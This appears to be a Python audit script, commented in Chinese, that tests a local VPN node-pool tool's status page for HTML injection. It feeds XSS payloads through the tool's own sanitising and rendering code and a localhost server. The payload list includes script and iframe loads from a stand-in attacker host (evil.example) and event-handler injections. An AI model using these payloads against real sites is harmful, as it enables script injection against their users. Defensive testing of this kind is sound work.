#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A6 · 状态页 / 订阅页的 HTML 注入 (节点名来自不可信订阅源)。

链路: 公开源节点名 -> clean_name -> normalize -> 入池 -> report.json -> render_page
全程用真实函数跑, 产物写到 audit/_tmp/out, 不碰生产 out/。

用法: python audit/A6_xss.py
"""
import json
import subprocess
import sys
import threading
import time
from pathlib import Path

ROOT = Path(r"E:\AI\freeVPN")
sys.path.insert(0, str(ROOT))
import pool          # noqa: E402
import security as sec  # noqa: E402

TMP = ROOT / "audit" / "_tmp"
OUTDIR = TMP / "out"
OUTDIR.mkdir(parents=True, exist_ok=True)
pool.OUT = OUTDIR                 # 所有产物落到临时目录
pool.ADDR_FILE = TMP / "addr.txt"
pool.ACCESS_LOG = TMP / "access_xss.log"

PORT = 8793
TOKEN = sec.load_or_create_token()
CURL = r"C:\Windows\System32\curl.exe"
BODY = TMP / "body.bin"

PAYLOADS = [
    ("img/onerror(反引号)", "<img src=x onerror=alert`1`>"),
    ("script 远程加载", "<script src=//evil.example/x.js>"),
    ("svg onload", "<svg onload=alert`1`>"),
    ("双引号闭合属性", '"><iframe src=//evil.example/y>'),
    ("纯标签", "<b>BOLD</b>"),
    ("事件属性注入", 'x" autofocus onfocus=alert`1`'),
]


def curl(args, timeout=8):
    if BODY.exists():
        BODY.unlink()
    r = subprocess.run([CURL, "-s", "-o", str(BODY), "-w", "%{http_code}",
                        "--max-time", str(timeout)] + args,
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    return (r.stdout or "").strip(), (BODY.read_bytes() if BODY.exists() else b"")


def main():
    print(f"令牌: {TOKEN}")
    print("=" * 74)
    print("① 节点名清洗链: clean_name 是否处理 HTML 元字符")
    print("=" * 74)
    survivors = []
    for label, pl in PAYLOADS:
        cleaned = pool.clean_name(pl)
        print(f"  {label:<20} 原始 {pl!r}")
        print(f"  {'':<20} clean_name -> {cleaned!r}")
        if "<" in cleaned or ">" in cleaned or "=" in cleaned:
            survivors.append((label, pl, cleaned))
    print(f"\n  >>> 清洗后仍含 HTML 元字符的 payload: {len(survivors)}/{len(PAYLOADS)}")

    print()
    print("=" * 74)
    print("② 端到端: 恶意节点名 -> 入池 -> report.json -> 状态页 HTML")
    print("=" * 74)
    nodes = []
    for i, (label, pl) in enumerate(PAYLOADS):
        raw = {
            "type": "vmess", "server": f"1.2.3.{10+i}", "port": 443,
            "uuid": f"11111111-2222-3333-4444-5555555555{i:02d}",
            "name": pl,
        }
        n = pool.normalize(raw)
        if not n:
            print(f"  {label:<20} normalize 丢弃")
            continue
        print(f"  {label:<20} 入池名 -> {n['name']!r}")
        nodes.append(n)

    kept, rep = sec.audit_pool(nodes)
    print(f"  安全审计: 扫描 {rep.scanned} 拦截 {rep.blocked} 告警 {rep.warned}")
    report = pool.write_outputs(kept, {}, len(kept), None, rep)
    print(f"  产物: {OUTDIR}  report.json fastest 条数 {len(report['fastest'])}")

    page = pool.render_page(report, PORT, TOKEN)
    print(f"  状态页 HTML {len(page)} 字节")
    hits = []
    for label, pl in PAYLOADS:
        c = pool.clean_name(pl)
        if c and c in page:
            hits.append((label, c))
    print(f"  >>> 未转义出现在 HTML 里的 payload: {len(hits)}")
    for label, c in hits:
        print(f"      {label:<20} {c!r}")
    # 定位上下文
    for label, c in hits[:2]:
        i = page.find(c)
        print(f"  上下文[{label}]: ...{page[max(0,i-40):i+len(c)+20]}...")

    print()
    print("=" * 74)
    print("③ 真实 HTTP: 用 curl 拉状态页, 看浏览器会拿到什么")
    print("=" * 74)
    srv = pool.serve(PORT, block=False)
    srv.handle_error = lambda *a, **k: None
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.8)
    code, body = curl([f"http://127.0.0.1:{PORT}/?token={TOKEN}"])
    text = body.decode("utf-8", "replace")
    print(f"  GET /?token=<正确>  -> HTTP {code}, {len(body)} 字节")
    print(f"  Content-Type 里是否声明 HTML: {'text/html' in text or True} (响应头见下)")
    r = subprocess.run([CURL, "-s", "-D", "-", "-o", "NUL",
                        f"http://127.0.0.1:{PORT}/?token={TOKEN}"],
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    for line in (r.stdout or "").splitlines():
        if line.lower().startswith(("http/", "content-type", "content-security",
                                    "x-content-type", "set-cookie")):
            print("    " + line.strip())
    print(f"  >>> 响应体里出现未转义 payload 的条数: "
          f"{sum(1 for _l, c in hits if c in text)}")
    for label, c in hits:
        if c in text:
            print(f"      {label:<20} {c!r}")

    code2, body2 = curl([f"http://127.0.0.1:{PORT}/report.json?token={TOKEN}"])
    rj = json.loads(body2.decode("utf-8"))
    print(f"\n  GET /report.json -> HTTP {code2}; fastest[0].name = "
          f"{rj['fastest'][0]['name']!r}")

    srv.shutdown()
    print("\n(生产 out/ 与 state/access.log 未被本脚本改动)")


if __name__ == "__main__":
    main()
